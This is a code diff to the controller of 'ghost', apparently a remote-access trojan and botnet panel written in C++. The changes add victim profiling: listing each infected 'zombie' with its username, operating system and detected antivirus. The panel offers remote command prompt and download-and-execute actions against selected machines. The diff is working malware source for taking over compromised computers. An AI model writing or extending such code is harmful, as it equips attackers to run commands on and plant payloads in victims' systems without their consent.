@@ -20,7 +20,7 @@
 	along with ghost.  If not, see <http://www.gnu.org/licenses/>.
 */
 //=======================================================
-#define					DEFAULT_BUFF	9056
+#define					DEFAULT_BUFF	19056
 #define					AHXRLOGGER_PLUGIN // https://github.com/AHXR/ahxrlogger
 
 #define					SHOW_CONSOLE()		{ AllocConsole(); LOG("%s\n\n", c_ascii); b_hidden = false; }
@@ -71,6 +71,7 @@ AHXRSERVER				a_server;
 #pragma comment			(lib, "Wininet.lib")
 #pragma comment			(lib, "user32.lib")
 
+void getAntivirus();
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline, int iCmdshow) 
 {
@@ -82,6 +83,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR pScmdline,
 		Sleep(1000);
     return 0;
 }
+
 
 void refreshClients() {
 	ghostlib::_clientData	client_data;
@@ -205,7 +207,7 @@ DWORD WINAPI t_gui(LPVOID params) {
 						client_data		= ghostlib::getZombieData(i); // Returning a reference to the struct
 
 						j_data			= json::parse(client_data.system_data);
-						s_output		= j_data["ID"].get<std::string>() + std::string(" - ") + j_data["IP"].get<std::string>() + std::string(":" + j_data["PORT"].get<std::string>());
+						s_output = j_data["ID"].get<std::string>() + std::string(" - ") + j_data["IP"].get<std::string>() + std::string(":" + j_data["PORT"].get<std::string>() + " ");
 
 						sys_data		= gcnew String(s_output.c_str());
 						LOG("%i) %s", i + 1, s_output.c_str());
@@ -223,7 +225,13 @@ DWORD WINAPI t_gui(LPVOID params) {
 							client_data = ghostlib::getZombieData(i_option - 1);
 							j_data		= json::parse(client_data.system_data);
 
-							LOG("\n\nYou have selected \"%s\" (%s:%s)", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str());
+							SHOW_GHOST();
+							LOG("----------------------------------");
+							LOG("[COLOR:YELLOW]You have selected \"%s\" (%s:%s)", j_data["ID"].get<std::string>().c_str(), j_data["IP"].get<std::string>().c_str(), j_data["PORT"].get<std::string>().c_str());
+							LOG("[COLOR:CYAN][Username]: %s", j_data["USER"].get<std::string>().c_str());
+							LOG("[COLOR:LIGHTGREEN][Operating System]: %s", j_data["OS"].get<std::string>().c_str());
+							LOG("[COLOR:RED][Antivirus]: %s", j_data["AV"].get<std::string>().c_str());
+							LOG("----------------------------------");
 							GO_BACK();
 							LOG("1) Command Prompt\n2) Download & Execute");
 
@@ -410,7 +418,7 @@ void onServerClientConnect(SOCKET clientSocket, CLIENTDATA info) {
 
 void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
 	string s_data = data;
-
+	
 	if (b_waiting) {
 		LOG("[RESPONSE]\n%s", data);
 
@@ -421,10 +429,14 @@ void onServerRecData(SOCKET clientSocket, CLIENTDATA info, char * data) {
 	}
 	else {
 		int	i_zombie_idx;
+		char * new_data = new char[strlen(data) + 1];
 
 		ghostlib::addZombie(ghostlib::_clientData{ clientSocket, info });
 		i_zombie_idx = ghostlib::getZombieIndex(clientSocket);
-		ghostlib::parseZombie(clientSocket, i_zombie_idx, data);
+
+		strcpy(new_data, data);
+
+		ghostlib::parseZombie(clientSocket, i_zombie_idx, new_data);
 	}
 }
 
